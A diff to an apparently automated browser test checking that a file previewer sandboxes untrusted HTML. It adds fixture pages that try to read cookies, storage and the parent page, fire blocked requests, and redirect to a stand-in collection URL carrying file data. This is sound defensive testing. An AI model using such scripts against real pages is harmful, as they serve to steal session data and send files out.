@@ -127,6 +127,20 @@ fs.writeFileSync(path.join(folder, "old.doc"), "legacy");
 fs.writeFileSync(path.join(folder, "old.xls"), "invented old workbook");
 fs.writeFileSync(path.join(folder, "macro.xlsm"), "invented macro workbook");
 fs.writeFileSync(path.join(folder, "plain.txt"), "plain");
+fs.writeFileSync(path.join(folder, "hostile.html"), `<!doctype html><body><script>
+const results = [];
+for (const [name, fn] of [["cookie", () => document.cookie], ["storage", () => localStorage.getItem("invented")], ["parent", () => parent.document.body.innerText]]) {
+  try { fn(); results.push(name + ":accessible"); } catch { results.push(name + ":blocked"); }
+}
+fetch("/healthz?hostile-fetch").catch(() => {});
+fetch("/api/remote/enable?hostile-api", { method: "POST" }).catch(() => {});
+try { const xhr = new XMLHttpRequest(); xhr.open("GET", "/healthz?hostile-xhr"); xhr.send(); } catch {}
+try { new WebSocket("ws://127.0.0.1:${port}/hostile-ws"); } catch {}
+const image = new Image(); image.src = "/healthz?hostile-image"; document.body.append(image);
+const form = document.createElement("form"); form.method = "POST"; form.action = "/healthz?hostile-form"; document.body.append(form); form.submit();
+document.body.dataset.result = results.join(",");
+</script></body>`);
+fs.writeFileSync(path.join(folder, "navigation.html"), `<script>location.href = "https://example.invalid/collect?data=invented-file-content"</script>`);
 const observedFiles = ["photo.png", "report.pdf", "report.docx", "sample.xlsx", "large.svg", "notes.md"];
 const digest = (name: string) => createHash("sha256").update(fs.readFileSync(path.join(folder, name))).digest("hex");
 const originalDigests = new Map(observedFiles.map((name) => [name, digest(name)]));
@@ -214,6 +228,30 @@ try {
 			if (request.url().includes("/workspace-image?")) imageRequests += 1;
 			if (request.url().includes("/workspace-preview?")) previewRequests += 1;
 		});
+        const forbiddenRequests: string[] = [];
+        context.on("requestfinished", request => { if (/hostile-(fetch|api|xhr|ws|image|form)/.test(request.url())) forbiddenRequests.push(request.url()); });
+        await treeFile("hostile.html").click();
+        const hostileFrame = page.frameLocator(".workspace-preview-html iframe");
+        await hostileFrame.locator("body[data-result]").waitFor();
+        assert(await hostileFrame.locator("body").getAttribute("data-result") === "cookie:blocked,storage:blocked,parent:blocked", "embedded HTML runs scripts with opaque origin");
+        const htmlFrame = page.locator(".workspace-preview-html iframe");
+        const directUrl = new URL((await htmlFrame.getAttribute("src"))!, baseUrl).href;
+        const direct = await context.newPage();
+        await direct.goto(directUrl);
+        await direct.locator("body[data-result]").waitFor();
+        const directResult = await direct.locator("body").getAttribute("data-result");
+        assert(directResult?.startsWith("cookie:blocked,storage:blocked"), "direct HTML retains opaque origin");
+        await direct.waitForTimeout(300);
+        assert(forbiddenRequests.length === 0 && !/hostile-(fetch|api|xhr|ws|image|form)/.test(serverOutput.join("")), "HTML cannot send API, connect, image or form requests");
+        let navigation = "";
+        await context.route("https://example.invalid/**", async route => { navigation = route.request().url(); await route.abort(); });
+        const navUrl = directUrl.replace("path=hostile.html", "path=navigation.html");
+        await direct.goto(navUrl).catch(() => {});
+        await waitUntil(() => Promise.resolve(navigation.includes("invented-file-content")), "intercepted self-navigation");
+        await direct.close();
+        await context.unroute("https://example.invalid/**");
+        await tab("hostile.html").locator(".workspace-tab-close").click();
+        previewRequests = 0;
 		await treeFile("notes.md").click();
 		await page.locator(".markdown-editor-tiptap .ProseMirror").waitFor({ timeout: 20_000 });
 		await treeFile("photo.png").click();
